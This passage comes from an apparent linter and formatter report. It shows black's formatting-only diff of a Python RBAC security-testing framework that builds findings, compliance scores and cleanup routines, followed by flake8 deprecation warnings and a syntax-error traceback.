in sensitive_patterns:\n                         if re.search(pattern, response.text, re.IGNORECASE):\n\u001b[31m-                            self.findings.append(SecurityFinding(\u001b[0m\n\u001b[31m-                                test_id=f\"{test_id}-{endpoint}\",\u001b[0m\n\u001b[31m-                                title=\"Sensitive Data Exposure\",\u001b[0m\n\u001b[31m-                                description=f\"Sensitive data pattern '{pattern}' found in {endpoint} response\",\u001b[0m\n\u001b[31m-                                risk_level=RiskLevel.MEDIUM,\u001b[0m\n\u001b[31m-                                status=TestStatus.FAIL,\u001b[0m\n\u001b[31m-                                details={\"endpoint\": endpoint, \"pattern\": pattern},\u001b[0m\n\u001b[31m-                                remediation=\"Remove sensitive data from API responses\",\u001b[0m\n\u001b[31m-                                affected_roles=[\"aws:read-only\"],\u001b[0m\n\u001b[31m-                                timestamp=datetime.datetime.utcnow().isoformat()\u001b[0m\n\u001b[31m-                            ))\u001b[0m\n\u001b[31m-                            \u001b[0m\n\u001b[32m+                            self.findings.append(\u001b[0m\n\u001b[32m+                                SecurityFinding(\u001b[0m\n\u001b[32m+                                    test_id=f\"{test_id}-{endpoint}\",\u001b[0m\n\u001b[32m+                                    title=\"Sensitive Data Exposure\",\u001b[0m\n\u001b[32m+                                    description=f\"Sensitive data pattern '{pattern}' found in {endpoint} response\",\u001b[0m\n\u001b[32m+                                    risk_level=RiskLevel.MEDIUM,\u001b[0m\n\u001b[32m+                                    status=TestStatus.FAIL,\u001b[0m\n\u001b[32m+                                    details={\u001b[0m\n\u001b[32m+                                        \"endpoint\": endpoint,\u001b[0m\n\u001b[32m+                                        \"pattern\": pattern,\u001b[0m\n\u001b[32m+                                    },\u001b[0m\n\u001b[32m+                                    remediation=\"Remove sensitive data from API responses\",\u001b[0m\n\u001b[32m+                                    affected_roles=[\"aws:read-only\"],\u001b[0m\n\u001b[32m+                                    timestamp=datetime.datetime.utcnow().isoformat(),\u001b[0m\n\u001b[32m+                                )\u001b[0m\n\u001b[32m+                            )\u001b[0m\n\u001b[32m+\u001b[0m\n         except Exception as e:\n             logger.error(f\"Error in data leakage test: {str(e)}\")\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     async def _run_ui_security_tests(self):\n         \"\"\"Test UI security controls\"\"\"\n         logger.info(\"Running UI security tests...\")\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         # Note: UI security tests would typically require browser automation\n         # This is a placeholder for the framework\n\u001b[31m-        logger.info(\"UI security tests would require browser automation framework\")\u001b[0m\n\u001b[31m-    \u001b[0m\n\u001b[32m+        logger.info(\u001b[0m\n\u001b[32m+            \"UI security tests would require browser automation framework\"\u001b[0m\n\u001b[32m+        )\u001b[0m\n\u001b[32m+\u001b[0m\n     async def cleanup_test_environment(self):\n         \"\"\"Clean up test environment\"\"\"\n         logger.info(\"Cleaning up test environment...\")\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         try:\n             # Delete test users\n             for role, user in self.test_users.items():\n                 try:\n                     self.cognito_client.admin_delete_user(\n\u001b[31m-                        UserPoolId=self.user_pool_id,\u001b[0m\n\u001b[31m-                        Username=user.username\u001b[0m\n\u001b[32m+                        UserPoolId=self.user_pool_id, Username=user.username\u001b[0m\n                     )\n                     logger.info(f\"Deleted test user: {user.username}\")\n                 except Exception as e:\n\u001b[31m-                    logger.error(f\"Failed to delete test user {user.username}: {str(e)}\")\u001b[0m\n\u001b[31m-            \u001b[0m\n\u001b[32m+                    logger.error(\u001b[0m\n\u001b[32m+                        f\"Failed to delete test user {user.username}: {str(e)}\"\u001b[0m\n\u001b[32m+                    )\u001b[0m\n\u001b[32m+\u001b[0m\n             logger.info(\"Test environment cleanup completed\")\n\u001b[31m-            \u001b[0m\n\u001b[32m+\u001b[0m\n         except Exception as e:\n             logger.error(f\"Error during cleanup: {str(e)}\")\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     def generate_security_report(self) -> Dict[str, Any]:\n         \"\"\"Generate comprehensive security report\"\"\"\n         logger.info(\"Generating security report...\")\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         # Categorize findings by risk level\n         findings_by_risk = {}\n         for finding in self.findings:\n             risk = finding.risk_level.value\n             if risk not in findings_by_risk:\n                 findings_by_risk[risk] = []\n             findings_by_risk[risk].append(asdict(finding))\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         # Calculate summary statistics\n\u001b[31m-        total_tests = len([f for f in self.findings if f.status != TestStatus.SKIP])\u001b[0m\n\u001b[31m-        passed_tests = len([f for f in self.findings if f.status == TestStatus.PASS])\u001b[0m\n\u001b[31m-        failed_tests = len([f for f in self.findings if f.status == TestStatus.FAIL])\u001b[0m\n\u001b[31m-        error_tests = len([f for f in self.findings if f.status == TestStatus.ERROR])\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[32m+        total_tests = len(\u001b[0m\n\u001b[32m+            [f for f in self.findings if f.status != TestStatus.SKIP]\u001b[0m\n\u001b[32m+        )\u001b[0m\n\u001b[32m+        passed_tests = len(\u001b[0m\n\u001b[32m+            [f for f in self.findings if f.status == TestStatus.PASS]\u001b[0m\n\u001b[32m+        )\u001b[0m\n\u001b[32m+        failed_tests = len(\u001b[0m\n\u001b[32m+            [f for f in self.findings if f.status == TestStatus.FAIL]\u001b[0m\n\u001b[32m+        )\u001b[0m\n\u001b[32m+        error_tests = len(\u001b[0m\n\u001b[32m+            [f for f in self.findings if f.status == TestStatus.ERROR]\u001b[0m\n\u001b[32m+        )\u001b[0m\n\u001b[32m+\u001b[0m\n         # Generate report\n         report = {\n             \"metadata\": {\n                 \"test_session_id\": self.test_session_id,\n                 \"timestamp\": datetime.datetime.utcnow().isoformat(),\n\u001b[31m-                \"test_environment\": self.config.get('environment', 'test'),\u001b[0m\n\u001b[32m+                \"test_environment\": self.config.get(\"environment\", \"test\"),\u001b[0m\n                 \"tester\": \"RBAC Security Testing Framework\",\n\u001b[31m-                \"version\": \"1.0.0\"\u001b[0m\n\u001b[32m+                \"version\": \"1.0.0\",\u001b[0m\n             },\n             \"executive_summary\": {\n                 \"total_tests\": total_tests,\n                 \"passed_tests\": passed_tests,\n                 \"failed_tests\": failed_tests,\n                 \"error_tests\": error_tests,\n\u001b[31m-                \"success_rate\": (passed_tests / total_tests * 100) if total_tests > 0 else 0,\u001b[0m\n\u001b[31m-                \"critical_findings\": len(findings_by_risk.get('CRITICAL', [])),\u001b[0m\n\u001b[31m-                \"high_findings\": len(findings_by_risk.get('HIGH', [])),\u001b[0m\n\u001b[31m-                \"medium_findings\": len(findings_by_risk.get('MEDIUM', [])),\u001b[0m\n\u001b[31m-                \"low_findings\": len(findings_by_risk.get('LOW', []))\u001b[0m\n\u001b[32m+                \"success_rate\": (passed_tests / total_tests * 100)\u001b[0m\n\u001b[32m+                if total_tests > 0\u001b[0m\n\u001b[32m+                else 0,\u001b[0m\n\u001b[32m+                \"critical_findings\": len(findings_by_risk.get(\"CRITICAL\", [])),\u001b[0m\n\u001b[32m+                \"high_findings\": len(findings_by_risk.get(\"HIGH\", [])),\u001b[0m\n\u001b[32m+                \"medium_findings\": len(findings_by_risk.get(\"MEDIUM\", [])),\u001b[0m\n\u001b[32m+                \"low_findings\": len(findings_by_risk.get(\"LOW\", [])),\u001b[0m\n             },\n             \"findings_by_risk\": findings_by_risk,\n             \"detailed_findings\": [asdict(f) for f in self.findings],\n             \"test_coverage\": {\n                 \"roles_tested\": list(self.test_users.keys()),\n\u001b[31m-                \"permissions_tested\": list(set().union(*[user.permissions for user in self.test_users.values()])),\u001b[0m\n\u001b[32m+                \"permissions_tested\": list(\u001b[0m\n\u001b[32m+                    set().union(\u001b[0m\n\u001b[32m+                        *[\u001b[0m\n\u001b[32m+                            user.permissions\u001b[0m\n\u001b[32m+                            for user in self.test_users.values()\u001b[0m\n\u001b[32m+                        ]\u001b[0m\n\u001b[32m+                    )\u001b[0m\n\u001b[32m+                ),\u001b[0m\n                 \"test_categories\": [\n                     \"Permission Boundary Tests\",\n                     \"Privilege Escalation Tests\",\n                     \"API Security Tests\",\n                     \"Data Access Tests\",\n\u001b[31m-                    \"UI Security Tests\"\u001b[0m\n\u001b[31m-                ]\u001b[0m\n\u001b[32m+                    \"UI Security Tests\",\u001b[0m\n\u001b[32m+                ],\u001b[0m\n             },\n             \"recommendations\": self._generate_recommendations(),\n\u001b[31m-            \"compliance_status\": self._assess_compliance()\u001b[0m\n\u001b[32m+            \"compliance_status\": self._assess_compliance(),\u001b[0m\n         }\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         return report\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     def _generate_recommendations(self) -> List[Dict[str, Any]]:\n         \"\"\"Generate security recommendations based on findings\"\"\"\n         recommendations = []\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         # Analyze findings and generate recommendations\n\u001b[31m-        critical_findings = [f for f in self.findings if f.risk_level == RiskLevel.CRITICAL]\u001b[0m\n\u001b[31m-        high_findings = [f for f in self.findings if f.risk_level == RiskLevel.HIGH]\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[32m+        critical_findings = [\u001b[0m\n\u001b[32m+            f for f in self.findings if f.risk_level == RiskLevel.CRITICAL\u001b[0m\n\u001b[32m+        ]\u001b[0m\n\u001b[32m+        high_findings = [\u001b[0m\n\u001b[32m+            f for f in self.findings if f.risk_level == RiskLevel.HIGH\u001b[0m\n\u001b[32m+        ]\u001b[0m\n\u001b[32m+\u001b[0m\n         if critical_findings:\n\u001b[31m-            recommendations.append({\u001b[0m\n\u001b[31m-                \"priority\": \"IMMEDIATE\",\u001b[0m\n\u001b[31m-                \"title\": \"Address Critical Security Vulnerabilities\",\u001b[0m\n\u001b[31m-                \"description\": f\"Found {len(critical_findings)} critical security issues that require immediate attention\",\u001b[0m\n\u001b[31m-                \"actions\": [f.remediation for f in critical_findings]\u001b[0m\n\u001b[31m-            })\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[32m+            recommendations.append(\u001b[0m\n\u001b[32m+                {\u001b[0m\n\u001b[32m+                    \"priority\": \"IMMEDIATE\",\u001b[0m\n\u001b[32m+                    \"title\": \"Address Critical Security Vulnerabilities\",\u001b[0m\n\u001b[32m+                    \"description\": f\"Found {len(critical_findings)} critical security issues that require immediate attention\",\u001b[0m\n\u001b[32m+                    \"actions\": [f.remediation for f in critical_findings],\u001b[0m\n\u001b[32m+                }\u001b[0m\n\u001b[32m+            )\u001b[0m\n\u001b[32m+\u001b[0m\n         if high_findings:\n\u001b[31m-            recommendations.append({\u001b[0m\n\u001b[31m-                \"priority\": \"HIGH\",\u001b[0m\n\u001b[31m-                \"title\": \"Fix High-Risk Security Issues\",\u001b[0m\n\u001b[31m-                \"description\": f\"Found {len(high_findings)} high-risk security issues\",\u001b[0m\n\u001b[31m-                \"actions\": [f.remediation for f in high_findings]\u001b[0m\n\u001b[31m-            })\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[32m+            recommendations.append(\u001b[0m\n\u001b[32m+                {\u001b[0m\n\u001b[32m+                    \"priority\": \"HIGH\",\u001b[0m\n\u001b[32m+                    \"title\": \"Fix High-Risk Security Issues\",\u001b[0m\n\u001b[32m+                    \"description\": f\"Found {len(high_findings)} high-risk security issues\",\u001b[0m\n\u001b[32m+                    \"actions\": [f.remediation for f in high_findings],\u001b[0m\n\u001b[32m+                }\u001b[0m\n\u001b[32m+            )\u001b[0m\n\u001b[32m+\u001b[0m\n         # Add general recommendations\n\u001b[31m-        recommendations.extend([\u001b[0m\n\u001b[31m-            {\u001b[0m\n\u001b[31m-                \"priority\": \"MEDIUM\",\u001b[0m\n\u001b[31m-                \"title\": \"Implement Continuous Security Testing\",\u001b[0m\n\u001b[31m-                \"description\": \"Integrate security tests into CI/CD pipeline\",\u001b[0m\n\u001b[31m-                \"actions\": [\u001b[0m\n\u001b[31m-                    \"Add security tests to deployment pipeline\",\u001b[0m\n\u001b[31m-                    \"Set up automated security monitoring\",\u001b[0m\n\u001b[31m-                    \"Implement security regression testing\"\u001b[0m\n\u001b[31m-                ]\u001b[0m\n\u001b[31m-            },\u001b[0m\n\u001b[31m-            {\u001b[0m\n\u001b[31m-                \"priority\": \"LOW\",\u001b[0m\n\u001b[31m-                \"title\": \"Enhance Security Monitoring\",\u001b[0m\n\u001b[31m-                \"description\": \"Improve security event logging and monitoring\",\u001b[0m\n\u001b[31m-                \"actions\": [\u001b[0m\n\u001b[31m-                    \"Enhance audit logging\",\u001b[0m\n\u001b[31m-                    \"Set up security event alerting\",\u001b[0m\n\u001b[31m-                    \"Implement anomaly detection\"\u001b[0m\n\u001b[31m-                ]\u001b[0m\n\u001b[31m-            }\u001b[0m\n\u001b[31m-        ])\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[32m+        recommendations.extend(\u001b[0m\n\u001b[32m+            [\u001b[0m\n\u001b[32m+                {\u001b[0m\n\u001b[32m+                    \"priority\": \"MEDIUM\",\u001b[0m\n\u001b[32m+                    \"title\": \"Implement Continuous Security Testing\",\u001b[0m\n\u001b[32m+                    \"description\": \"Integrate security tests into CI/CD pipeline\",\u001b[0m\n\u001b[32m+                    \"actions\": [\u001b[0m\n\u001b[32m+                        \"Add security tests to deployment pipeline\",\u001b[0m\n\u001b[32m+                        \"Set up automated security monitoring\",\u001b[0m\n\u001b[32m+                        \"Implement security regression testing\",\u001b[0m\n\u001b[32m+                    ],\u001b[0m\n\u001b[32m+                },\u001b[0m\n\u001b[32m+                {\u001b[0m\n\u001b[32m+                    \"priority\": \"LOW\",\u001b[0m\n\u001b[32m+                    \"title\": \"Enhance Security Monitoring\",\u001b[0m\n\u001b[32m+                    \"description\": \"Improve security event logging and monitoring\",\u001b[0m\n\u001b[32m+                    \"actions\": [\u001b[0m\n\u001b[32m+                        \"Enhance audit logging\",\u001b[0m\n\u001b[32m+                        \"Set up security event alerting\",\u001b[0m\n\u001b[32m+                        \"Implement anomaly detection\",\u001b[0m\n\u001b[32m+                    ],\u001b[0m\n\u001b[32m+                },\u001b[0m\n\u001b[32m+            ]\u001b[0m\n\u001b[32m+        )\u001b[0m\n\u001b[32m+\u001b[0m\n         return recommendations\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     def _assess_compliance(self) -> Dict[str, Any]:\n         \"\"\"Assess compliance with security standards\"\"\"\n\u001b[31m-        total_tests = len([f for f in self.findings if f.status != TestStatus.SKIP])\u001b[0m\n\u001b[31m-        passed_tests = len([f for f in self.findings if f.status == TestStatus.PASS])\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[31m-        compliance_score = (passed_tests / total_tests * 100) if total_tests > 0 else 0\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[32m+        total_tests = len(\u001b[0m\n\u001b[32m+            [f for f in self.findings if f.status != TestStatus.SKIP]\u001b[0m\n\u001b[32m+        )\u001b[0m\n\u001b[32m+        passed_tests = len(\u001b[0m\n\u001b[32m+            [f for f in self.findings if f.status == TestStatus.PASS]\u001b[0m\n\u001b[32m+        )\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+        compliance_score = (\u001b[0m\n\u001b[32m+            (passed_tests / total_tests * 100) if total_tests > 0 else 0\u001b[0m\n\u001b[32m+        )\u001b[0m\n\u001b[32m+\u001b[0m\n         # Determine compliance status\n         if compliance_score >= 95:\n             status = \"COMPLIANT\"\n         elif compliance_score >= 80:\n             status = \"MOSTLY_COMPLIANT\"\n         elif compliance_score >= 60:\n             status = \"PARTIALLY_COMPLIANT\"\n         else:\n             status = \"NON_COMPLIANT\"\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         return {\n             \"overall_status\": status,\n             \"compliance_score\": compliance_score,\n             \"standards\": {\n                 \"AWS_Security_Standards\": status,\n\u001b[31m-                \"Least_Privilege_Principle\": \"COMPLIANT\" if not any(f.risk_level == RiskLevel.CRITICAL for f in self.findings) else \"NON_COMPLIANT\",\u001b[0m\n\u001b[31m-                \"Defense_in_Depth\": \"COMPLIANT\" if compliance_score >= 80 else \"NON_COMPLIANT\"\u001b[0m\n\u001b[32m+                \"Least_Privilege_Principle\": \"COMPLIANT\"\u001b[0m\n\u001b[32m+                if not any(\u001b[0m\n\u001b[32m+                    f.risk_level == RiskLevel.CRITICAL for f in self.findings\u001b[0m\n\u001b[32m+                )\u001b[0m\n\u001b[32m+                else \"NON_COMPLIANT\",\u001b[0m\n\u001b[32m+                \"Defense_in_Depth\": \"COMPLIANT\"\u001b[0m\n\u001b[32m+                if compliance_score >= 80\u001b[0m\n\u001b[32m+                else \"NON_COMPLIANT\",\u001b[0m\n             },\n\u001b[31m-            \"gaps\": [f.title for f in self.findings if f.status == TestStatus.FAIL]\u001b[0m\n\u001b[32m+            \"gaps\": [\u001b[0m\n\u001b[32m+                f.title for f in self.findings if f.status == TestStatus.FAIL\u001b[0m\n\u001b[32m+            ],\u001b[0m\n         }\n\u001b[32m+\u001b[0m\n \n async def main():\n     \"\"\"Main execution function\"\"\"\n     tester = RBACSecurityTester()\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     try:\n         # Setup test environment\n         if not await tester.setup_test_environment():\n             logger.error(\"Failed to setup test environment\")\n             return\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         # Run security tests\n         findings = await tester.run_security_tests()\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         # Generate report\n         report = tester.generate_security_report()\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         # Save report\n         report_file = f\"tests/security/reports/security_report_{tester.test_session_id}.json\"\n         Path(report_file).parent.mkdir(parents=True, exist_ok=True)\n\u001b[31m-        \u001b[0m\n\u001b[31m-        with open(report_file, 'w') as f:\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+        with open(report_file, \"w\") as f:\u001b[0m\n             json.dump(report, f, indent=2)\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         logger.info(f\"Security report saved to: {report_file}\")\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         # Print summary\n\u001b[31m-        print(\"\\n\" + \"=\"*60)\u001b[0m\n\u001b[32m+        print(\"\\n\" + \"=\" * 60)\u001b[0m\n         print(\"RBAC SECURITY TEST SUMMARY\")\n\u001b[31m-        print(\"=\"*60)\u001b[0m\n\u001b[32m+        print(\"=\" * 60)\u001b[0m\n         print(f\"Total Tests: {report['executive_summary']['total_tests']}\")\n         print(f\"Passed: {report['executive_summary']['passed_tests']}\")\n         print(f\"Failed: {report['executive_summary']['failed_tests']}\")\n         print(f\"Errors: {report['executive_summary']['error_tests']}\")\n\u001b[31m-        print(f\"Success Rate: {report['executive_summary']['success_rate']:.1f}%\")\u001b[0m\n\u001b[32m+        print(\u001b[0m\n\u001b[32m+            f\"Success Rate: {report['executive_summary']['success_rate']:.1f}%\"\u001b[0m\n\u001b[32m+        )\u001b[0m\n         print(f\"\\nFindings by Risk Level:\")\n\u001b[31m-        print(f\"  Critical: {report['executive_summary']['critical_findings']}\")\u001b[0m\n\u001b[32m+        print(\u001b[0m\n\u001b[32m+            f\"  Critical: {report['executive_summary']['critical_findings']}\"\u001b[0m\n\u001b[32m+        )\u001b[0m\n         print(f\"  High: {report['executive_summary']['high_findings']}\")\n         print(f\"  Medium: {report['executive_summary']['medium_findings']}\")\n         print(f\"  Low: {report['executive_summary']['low_findings']}\")\n\u001b[31m-        print(f\"\\nCompliance Status: {report['compliance_status']['overall_status']}\")\u001b[0m\n\u001b[31m-        print(f\"Compliance Score: {report['compliance_status']['compliance_score']:.1f}%\")\u001b[0m\n\u001b[31m-        print(\"=\"*60)\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[32m+        print(\u001b[0m\n\u001b[32m+            f\"\\nCompliance Status: {report['compliance_status']['overall_status']}\"\u001b[0m\n\u001b[32m+        )\u001b[0m\n\u001b[32m+        print(\u001b[0m\n\u001b[32m+            f\"Compliance Score: {report['compliance_status']['compliance_score']:.1f}%\"\u001b[0m\n\u001b[32m+        )\u001b[0m\n\u001b[32m+        print(\"=\" * 60)\u001b[0m\n\u001b[32m+\u001b[0m\n     finally:\n         # Cleanup\n         await tester.cleanup_test_environment()\n \n\u001b[32m+\u001b[0m\n if __name__ == \"__main__\":\n\u001b[31m-    asyncio.run(main())\u001b[0m\n\\ No newline at end of file\n\u001b[32m+    asyncio.run(main())\u001b[0m\n",
      "errors": "would reformat tests/python/check_pg_response.py\nwould reformat tests/python/cleanup_all_data.py\nwould reformat tests/python/conftest.py\nwould reformat tests/python/create_real_test_data.py\nwould reformat tests/python/create_test_plan.py\nwould reformat tests/python/create_test_ui.py\nwould reformat tests/python/e2e/get_auth_token.py\nwould reformat tests/python/e2e/test_protection_groups_fix.py\nwould reformat tests/python/e2e/test_protection_group_crud.py\nwould reformat tests/python/e2e/test_recovery_plan_api_crud.py\nwould reformat scripts/monitor_lambda_drill.py\nwould reformat tests/python/e2e/test_recovery_plan_bugs.py\nwould reformat scripts/test_drs_drill_trace.py\nwould reformat tests/python/monitor_drs_drill.py\nwould reformat tests/python/monitor_execution.py\nwould reformat tests/python/e2e/test_recovery_plan_e2e.py\nwould reformat tests/python/unit/test_infrastructure_smoke.py\nwould reformat tests/python/test_drs_validation.py\nwould reformat tests/python/mocks/mock_drs_client.py\nwould reformat tests/python/standalone_drs_drill.py\nwould reformat tests/python/test_with_lambda_invoke.py\nwould reformat tests/python/validate_setup.py\nwould reformat tests/python/unit/test_fixtures.py\nwould reformat tests/python/unit/test_data_generator.py\nwould reformat tests/security/validate_framework.py\nwould reformat tests/python/fixtures/recovery_plan_fixtures.py\nwould reformat tests/python/unit/test_wave_transformation.py\nwould reformat tests/python/unit/test_mock_drs_client.py\nwould reformat tests/python/unit/test_recovery_plan_delete.py\nwould reformat tests/security/demo_security_test.py\nwould reformat tests/python/unit/test_drs_service_limits.py\nwould reformat tests/python/automated_e2e_test.py\nwould reformat tests/python/utils/test_data_generator.py\nwould reformat tests/security/run_security_tests.py\nwould reformat tests/security/rbac_security_tests.py\n\nOh no! \ud83d\udca5 \ud83d\udc94 \ud83d\udca5\n35 files would be reformatted, 18 files would be left unchanged.\n",
      "return_code": 1
    },
    "flake8": {
      "tool": "flake8",
      "status": "failed",
      "files_checked": 53,
      "total_violations": 0,
      "violations": [],
      "output": "",
      "errors": "/Users/jocousen/.local/share/mise/installs/python/3.12.11/lib/python3.12/site-packages/flake8_import_order/styles.py:3: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.\n  from pkg_resources import iter_entry_points\n/Users/jocousen/.local/share/mise/installs/python/3.12.11/lib/python3.12/site-packages/flake8_import_order/styles.py:3: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.\n  from pkg_resources import iter_entry_points\n/Users/jocousen/.local/share/mise/installs/python/3.12.11/lib/python3.12/site-packages/flake8_import_order/styles.py:3: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.\n  from pkg_resources import iter_entry_points\n/Users/jocousen/.local/share/mise/installs/python/3.12.11/lib/python3.12/site-packages/flake8_import_order/styles.py:3: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.\n  from pkg_resources import iter_entry_points\n/Users/jocousen/.local/share/mise/installs/python/3.12.11/lib/python3.12/site-packages/flake8_import_order/styles.py:3: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.\n  from pkg_resources import iter_entry_points\n/Users/jocousen/.local/share/mise/installs/python/3.12.11/lib/python3.12/site-packages/flake8_import_order/styles.py:3: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.\n  from pkg_resources import iter_entry_points\n/Users/jocousen/.local/share/mise/installs/python/3.12.11/lib/python3.12/site-packages/flake8_import_order/styles.py:3: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.\n  from pkg_resources import iter_entry_points\n/Users/jocousen/.local/share/mise/installs/python/3.12.11/lib/python3.12/site-packages/flake8_import_order/styles.py:3: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.\n  from pkg_resources import iter_entry_points\n/Users/jocousen/.local/share/mise/installs/python/3.12.11/lib/python3.12/site-packages/flake8_import_order/styles.py:3: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.\n  from pkg_resources import iter_entry_points\n/Users/jocousen/.local/share/mise/installs/python/3.12.11/lib/python3.12/site-packages/flake8_import_order/styles.py:3: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.\n  from pkg_resources import iter_entry_points\n/Users/jocousen/.local/share/mise/installs/python/3.12.11/lib/python3.12/site-packages/flake8_import_order/styles.py:3: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.\n  from pkg_resources import iter_entry_points\n/Users/jocousen/.local/share/mise/installs/python/3.12.11/lib/python3.12/site-packages/flake8_import_order/styles.py:3: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.\n  from pkg_resources import iter_entry_points\n/Users/jocousen/.local/share/mise/installs/python/3.12.11/lib/python3.12/site-packages/flake8_import_order/styles.py:3: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.\n  from pkg_resources import iter_entry_points\n/Users/jocousen/.local/share/mise/installs/python/3.12.11/lib/python3.12/site-packages/flake8_import_order/styles.py:3: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.\n  from pkg_resources import iter_entry_points\n/Users/jocousen/.local/share/mise/installs/python/3.12.11/lib/python3.12/site-packages/flake8_import_order/styles.py:3: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.\n  from pkg_resources import iter_entry_points\nmultiprocessing.pool.RemoteTraceback: \n\"\"\"\nTraceback (most recent call last):\n  File \"/Users/jocousen/.local/share/mise/installs/python/3.12.11/lib/python3.12/site-packages/pydocstyle/parser.py\", line 427, in parse\n    compile(src, filename, 'exec')\n  File \"tests/python/monitor_execution.py\", line 34\n    ExpressionAttributeValues={\n    ^\nSyntaxError: keyword argument repeated: ExpressionAttributeValues\n\nThe above exception was the direct cause of the following exception:\n\nTraceback (most recent call last):\n  File \"/Users/jocousen/.local/share/mise/installs/python/3.12.11/lib/python3.12/multiprocessing/pool.py\", line 125, in worker\n    result = (True, func(*args, **kwds))\n                    ^^^^^^^^^^^^^^^^^^^\n  File \"/Users/jocousen/.local/share/mise/installs/python/3.12.11/lib/python3.12/site-packages/flake8/checker.py\", line 81, in _mp_run\n    ).run_checks()\n      ^^^^^^^^^^^^\n  File \"/Users/jocousen/.local/share/mise/installs/python/3.12.11/lib/python3.12/site-packages/flake8/checker.py\", line 524, in run_checks\n    self.run_ast_checks()\n  File \"/Users/jocousen/.local/share/mise/installs/python/3.12.11/lib/python3.12/site-packages/flake8/checker.py\", line 426, in run_ast_checks\n    for (line_number, offset, text, _) in runner:\n                                          ^^^^^^\n  File \"/Users/jocousen/.local/share/mise/installs/python/3.12.11/lib/python3.12/site-packages/flake8_docstrings.py\", line 188, in run\n    for error in self._check_source():\n                 ^^^^^^^^^^^^^^^^^^^^\n  File \"/Users/jocousen/.local/share/mise/installs/python/3.12.11/lib/python3.12/site-packages/flake8_docstrings.py\", line 172, in _check_source\n    for err in self._call_check_source():\n               ^^^^^^^^^^^^^^^^^^^^^^^^^\n  File \"/Users/jocousen/.local/share/mise/installs/python/3.12.11/lib/python3.12/site-packages/pydocstyle/checker.py\", line 145, in check_source\n    module = parse(StringIO(source), filename)\n             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n  File \"/Users/jocousen/.local/share/mise/installs/python/3.12.11/lib/python3.12/site-packages/pydocstyle/parser.py\", line 441, in __call__\n    return self.parse(*args, **kwargs)\n           ^^^^^^^^^^^^^^^^^^^^^^^^^^^\n  File \"/Users/jocousen/.local/share/mise/installs/python/3.12.11/lib/python3.12/site-packages/pydocstyle/parser.py\", line 429, in parse\n  